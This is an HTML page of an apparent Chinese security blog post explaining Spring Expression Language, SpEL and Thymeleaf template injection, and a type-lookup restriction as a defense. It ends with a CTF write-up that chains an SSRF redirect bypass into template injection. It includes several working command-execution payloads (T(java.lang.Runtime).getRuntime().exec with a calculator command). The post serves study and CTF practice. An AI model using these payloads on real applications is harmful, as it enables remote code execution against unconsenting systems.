@@ -1,0 +1,388 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SpEL补充 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SpEL补充 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="什么是EL？
+表达式语言（Expression Language，简称EL）是一种专门用于在应用程序中访问数据和函数的轻量级编程语言，通常用于Web应用程序中。它最初是为了简化在JavaServer Pages (JSP) 中的页面编码而设..." />
+    <meta name="keywords" content="Java,thymeleaf,SpEL,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SpEL补充
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-05-05
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/tZ2VQ2HMT/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/oPmzXqAUjU/" class="post-tag">
+                  # thymeleaf
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/EiKKt5PekL/" class="post-tag">
+                  # SpEL
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/spel-bu-chong.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="什么是el">什么是EL？</h1>
+<p>表达式语言（Expression Language，简称EL）是一种专门用于在应用程序中访问数据和函数的轻量级编程语言，通常用于Web应用程序中。它最初是为了简化在JavaServer Pages (JSP) 中的页面编码而设计的，但其使用已经扩展到其他技术领域。</p>
+<h1 id="什么是spel">什么是SpEL？</h1>
+<p>SpEL(Spring Expression Language)是Spring框架中的一个强大的表达式语言，它扩展了标准EL的概念。SpEL支持更复杂的表达式如方法调用、字符串模板表达式、数组创建、列表选择、映射访问等。</p>
+<p>SpEL与传统的EL相比，提供了更加丰富的功能集，可以在更广泛的Spring项目中使用，如安全性表达式、数据绑定、条件表达式等。SpEL不仅仅限于Web环境，也可用于任何需要动态表达式计算的Spring应用程序中。</p>
+<h1 id="spel用法示例">SpEL用法示例</h1>
+<p>使用示例参考文档：<a href="https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html">https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html</a></p>
+<p>SpEL支持以下功能：</p>
+<ul>
+<li>字面表达式</li>
+<li>布尔和关系运算符</li>
+<li>正则表达式</li>
+<li>类表达式</li>
+<li>访问属性、数组、列表和映射</li>
+<li>方法调用</li>
+<li>关系运算符</li>
+<li>调用构造函数</li>
+<li>bean引用</li>
+<li>数组构造</li>
+<li>内联的list</li>
+<li>内联的map</li>
+<li>三元运算符</li>
+<li>变量</li>
+<li>用户自定义函数</li>
+<li>集合选择</li>
+<li>模板化表达式</li>
+</ul>
+<p>解析字符串</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;'Hello World'&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>调用方法</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.concat('!')&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>访问属性</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.bytes&quot;);
+byte[] bytes = (byte[]) exp.getValue();
+</code></pre>
+<p>使用构造函数</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;new String('hello world').toUpperCase()&quot;);
+String message = exp.getValue(String.class);
+</code></pre>
+<p>针对一个特定的对象实例（称为root object）提供被解析的表达式字符串</p>
+<pre><code class="language-java">User user = new User(&quot;skky&quot;, &quot;123456&quot;);
+Expression objExp = parser.parseExpression(&quot;name&quot;);
+
+EvaluationContext context = new StandardEvaluationContext(user);
+String name = (String) objExp.getValue(context);
+</code></pre>
+<p><code>T</code>操作符用于访问指定的类及其静态方法和静态属性，用来获取<strong>java.lang.Runtime</strong>下的<code>getRuntime()</code>也是SpEL注入主要的利用方式</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>关于<code>T</code>操作符文档中有个比较有意思的内容</p>
+<blockquote>
+<p>The StandardEvaluationContext uses a TypeLocator to find types and the StandardTypeLocator (which can be replaced) is built with an understanding of the java.lang package. This means T() references to types within java.lang do not need to be fully qualified, but all other type references must be.</p>
+</blockquote>
+<p>这里提到的<code>TypeLocator</code>和<code>StandardTypeLocator</code>：</p>
+<ul>
+<li><code>TypeLocator</code>：这是一个接口，SpEL使用它来查找类型。<code>StandardEvaluationContext</code>使用这个接口的实现来确定如何找到表达式中引用的类型。</li>
+<li><code>StandardTypeLocator</code>：这是<code>TypeLocator</code>的一个标准实现，默认情况下它了解<code>java.lang</code>包。因此，对于<code>java.lang</code>包中的类，你不需要提供完整的包名。例如，<code>T(String)</code>已经足够引用<code>java.lang.String</code>类。但是对于非j<code>ava.lang</code>包中的其他类，你必须使用完整的类名，如<code>T(com.example.MyClass)</code>。</li>
+</ul>
+<p>参考的使用方式是用来方便地解析和引用类。比如有下面这个类</p>
+<pre><code class="language-java">package com.examples;
+
+public class Utility {
+    public static String getGreeting() {
+        return &quot;Hello, World!&quot;;
+    }
+}
+</code></pre>
+<p>使用<code>StandardTypeLocator</code>来简化查找</p>
+<pre><code class="language-java">StandardEvaluationContext context_example = new StandardEvaluationContext();
+
+// 使用StandardTypeLocator并添加一个新的包前缀
+StandardTypeLocator typeLocator = new StandardTypeLocator();
+typeLocator.registerImport(&quot;com.examples&quot;);
+
+context_example.setTypeLocator(typeLocator);
+
+// 现在可以不使用全路径来调用getGreeting()方法
+String greeting = parser.parseExpression(&quot;T(Utility).getGreeting()&quot;).getValue(context_example, String.class);
+</code></pre>
+<p>那么这个<code>StandardTypeLocator</code>可不可以用来限制一些类的查找呢？</p>
+<p>答案是可以的，我们可以继承<code>StandardTypeLocator</code>然后重写它的<code>findType</code>方法来增加查找类的限制</p>
+<pre><code class="language-java">import org.springframework.expression.EvaluationException;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+import org.springframework.expression.spel.support.StandardTypeLocator;
+
+
+public class exploit {
+    public static void main(String[] args) {
+        ExpressionParser parser = new SpelExpressionParser();
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        context.setTypeLocator(new RestrictedTypeLocator());
+
+        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
+        String message = (String) exp.getValue(context);
+    }
+}
+
+
+class RestrictedTypeLocator extends StandardTypeLocator {
+    public RestrictedTypeLocator() {
+        super();
+    }
+
+    @Override
+    public Class&lt;?&gt; findType(String typeName) throws EvaluationException {
+        if (typeName.startsWith(&quot;java.lang.Runtime&quot;)) {
+            throw new EvaluationException(&quot;Access denied for type: &quot; + typeName);
+        } else {
+            return super.findType(typeName);
+        }
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/spel_re/1714828150238-d60d5fc8-1634-4843-b911-73bc62960c95.png" alt="image.png" loading="lazy"></figure>
+<p>另外关于<code>StandardEvaluationContext</code>还有一个设置解析前后缀的用法，具体参考P神的javacon，这里就不赘述了。</p>
+<h1 id="thymeleaf与spel">Thymeleaf与SpEL</h1>
+<p>Thymeleaf 是一个Java 模板引擎，它使用的模版语法是其自己实现的，叫_Standard_。它的语法格式有下面几种</p>
+<ul>
+<li><code>${...}</code>: Variable expressions.</li>
+<li><code>*{...}</code>: Selection expressions.</li>
+<li><code>#{...}</code>: Message (i18n) expressions.</li>
+<li><code>@{...}</code>: Link (URL) expressions.</li>
+<li><code>~{...}</code>: Fragment expressions.</li>
+<li><code>__...__</code>:  Expression preprocessing.</li>
+</ul>
+<p>除了学习模版注入的后两种（Fragment expressions, Expression preprocessing），前两种(Variable expressions, Selection expressions)也是值得注意的</p>
+<blockquote>
+<p>Variable expressions are OGNL expressions –or Spring EL if you’re integrating Thymeleaf with Spring– executed on the <em>context variables</em> — also called <em>model attributes</em> in Spring jargon.</p>
+<p>Selection expressions are just like variable expressions, except they will be executed on a previously selected object instead of the whole context variables map.</p>
+</blockquote>
+<p>这里面的内容Thymeleaf会根据当前的环境，将其当作Spring EL或OGNL来解析。</p>
+<p>所以前面看的Thymeleaf模版注入，其实就是用在解析模版名称的时候，在模板名称中注入了一个预处理表达式，这个预处理表达式包裹的是一个变量表达式，这个变量表达式就可以用来执行任意的SpEL表达式。</p>
+<p>另外之前看到的在下面这种可以完全控制解析的模版名称的情景</p>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+public String path(@RequestParam String lang) {
+    return lang; // template path is tainted
+}
+</code></pre>
+<p>这里不走解析预处理表达式（不使用<code>_</code>的情况）也是可以的</p>
+<pre><code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x
+</code></pre>
+<p>使用<code>::</code>进入片段表达式的解析逻辑，由于没有预处理表达式，传入的模版名称被<code>~{...}</code>包裹后直接作为片段表达式解析返回<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714831173471-bf69b695-c458-46d8-a5cd-dcbc4e9f6166.png" alt="image.png" loading="lazy"></p>
+<p>构造的变量表达式被解析成了<code>templateName</code>，接着在后面的<code>FragmentExpression.createExecutedFragmentExpression(context, fragmentExpression);</code>可以清楚的看到其作为变量表达式被解析的代码<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714831375949-fd272a78-da73-41bb-88b6-fd5a51f804b3.png" alt="image.png" loading="lazy"></p>
+<h1 id="2024红明谷simp1escape">2024红明谷｜Simp1escape</h1>
+<p><code>/curl</code>路由存在SSRF，可以使用302跳转绕过。这里记一下它的处理逻辑，下次看到就可以用了</p>
+<pre><code class="language-java">InetAddress inetAddress = InetAddress.getByName(hostname);
+if (Utils.isPrivateIp(inetAddress)) {
+    return &quot;Illegal ip address&quot;;
+} else {
+    try {
+        // ......
+        TimeUnit.SECONDS.sleep(4L);
+        HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection();
+        if (connection instanceof HttpURLConnection) {
+            connection.connec
+            // ......
+</code></pre>
+<p>用这个SSRF攻击<code>/getsites</code></p>
+<pre><code class="language-java">@GetMapping({&quot;/getsites&quot;})
+public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception {
+    String ipAddress = request.getRemoteAddr();
+    if (!ipAddress.equals(&quot;127.0.0.1&quot;)) {
+        response.setStatus(HttpStatus.FORBIDDEN.value());
+        return &quot;forbidden&quot;;
+    } else {
+        Context context = new Context();
+        TemplateEngine engine = new SpringTemplateEngine();
+        String dispaly = engine.process(hostname, context);
+        return dispaly;
+    }
+}
+</code></pre>
+<p><code>SpringTemplateEngine.process</code>是用的父类<code>org.thymeleaf.TemplateEngine</code>实现的，根据<a href="https://www.thymeleaf.org/apidocs/thymeleaf/3.0.0.BETA02/org/thymeleaf/TemplateEngine.html#process-java.lang.String-org.thymeleaf.context.IContext-">API文档</a>的描述，<code>process</code>就是将传入template当作模版内容来处理的<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714834031770-cde5607a-be13-4ed7-873c-d460ad53d9a8.png" alt="image.png" loading="lazy"></p>
+<p>所以最简单的方式就是传入一个包含变量表达式的模版，然后用变量表达式执行任意的SpEL表达式。比如：</p>
+<pre><code>&lt;td th:text=&quot;${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}&quot;&gt;&lt;/td&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/spel_re/1714834318634-c857d19f-7639-467d-90bc-ab0261151565.png" alt="image.png" loading="lazy"></figure>
+<p>另外，之前看到的<code>[[...]]</code>这种写法其实是一种内联表达式的写法，参照<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#inlining">官方文档</a>给的例子，应该就是让其在任何文本标签中执行Thymeleaf的Standard Expression。</p>
+<p>所以这个payload也可以写成</p>
+<pre><code>[[${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}]]
+</code></pre>
+<p>另外在题目的thymeleaf3.0.15版本中，在对返回的模版名称<code>viewTemplateName</code>新增了检查<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714835193225-cec8fb6a-f33a-49fa-8772-8f1637353cc3.png" alt="image.png" loading="lazy"></p>
+<p>这个 <code>checkViewNameNotInRequest</code> 函数是为了确保在处理视图名字时，避免视图名称中包含的表达式被恶意利用，所以直接传入<code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x</code>是无法被利用的。</p>
+<p>另外，在预处理的部分也新增对恶意利用的检查，这部分的绕过具体参考<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFel">什么是EL？</a></li>
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFspel">什么是SpEL？</a></li>
+<li><a href="#spel%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B">SpEL用法示例</a></li>
+<li><a href="#thymeleaf%E4%B8%8Espel">Thymeleaf与SpEL</a></li>
+<li><a href="#2024%E7%BA%A2%E6%98%8E%E8%B0%B7simp1escape">2024红明谷｜Simp1escape</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/spel-biao-da-shi-zhu-ru-chu-jian/">
+              <h3 class="post-title">
+                SpEL表达式注入初见
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
